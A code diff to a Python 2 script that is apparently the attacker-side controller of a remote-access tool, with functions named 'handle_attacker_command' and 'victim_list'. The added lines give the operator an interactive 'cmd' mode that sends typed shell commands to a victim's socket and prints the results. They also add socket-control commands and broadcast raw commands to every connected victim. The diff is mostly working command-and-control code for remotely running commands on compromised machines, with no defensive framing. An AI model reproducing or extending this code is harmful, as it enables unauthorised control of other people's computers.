@@ -2,6 +2,7 @@ import socket
 import select
 import msvcrt
 import os
+import sys
 
 SERVER_IP = '127.0.0.1'
 SERVER_PORT = 2005
@@ -15,6 +16,7 @@ open_client_sockets = []
 messages_to_send = []
 action_message = []
 mode = None
+msg = ''
 
 
 def update_version(socket, command_message):
@@ -31,24 +33,48 @@ def update_version(socket, command_message):
     print("done")
 
 
-def terminate(socket, command_message):
+def terminate(socket, params):
     socket.send('0')
+
+
+def cmd(socket, command_message):
+    socket.send('2')
+    prompt_str = socket.getsockname()[0] + ':' + str(socket.getsockname()[1])
+
+    while True:
+        try:
+            print 'cmd mode'
+            command = raw_input(prompt_str + ">")
+            if len(command.split()) != 0:
+                socket.send(command)
+            else:
+                continue
+        except EOFError:
+            print("Invalid input, type 'help' to get a list of implemented commands.\n")
+            continue
+
+        if command == "quit":
+            break
+
+        data = socket.recv(SOCKET_RECV_BYTES)
+        print(data + "\n")
+
+
+def open_socket(socket, command_message):
+    socket.send(command_message)
+
+
+def change_socket(socket, command_message):
+    socket.send(command_message)
 
 
 command_dict = {
     0: terminate,
-    4: update_version
+    2: cmd,
+    3: open_socket,
+    4: update_version,
+    5: change_socket
 }
-
-
-# def action_to_preform(message):
-#     action_code = int(message)
-#     return action_dict[action_code]()
-#
-#
-# def manipulate_data(encrypt_message):
-#     decrypt_message = decryption(encrypt_message)
-#     return action_to_preform(decrypt_message)
 
 
 def decryption(message):
@@ -60,9 +86,15 @@ def get_command_id(my_string_msg):
 
 
 def handle_attacker_command(victim_list):
+    global msg
     if msvcrt.kbhit():  # if the client typed character
         char = msvcrt.getch()  # get this character
+        msg += char  
+        sys.stdout.write(char)  
+        sys.stdout.flush()  
+
         if chr(KEY_ENTER) is char:  # if enter
+            msg = ''   
             command_message = ''.join(action_message)
             print '[Attacker]', command_message
             command_id = get_command_id(command_message)
@@ -70,7 +102,9 @@ def handle_attacker_command(victim_list):
                 command_dict[command_id](victim_list[0], command_message)
             else:
                 for wsocket in victim_list:
-                    wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))
+                    print '[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message)
+                    wsocket.send(command_message)
+                    # wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))
 
             del action_message[:]  # clean array
 
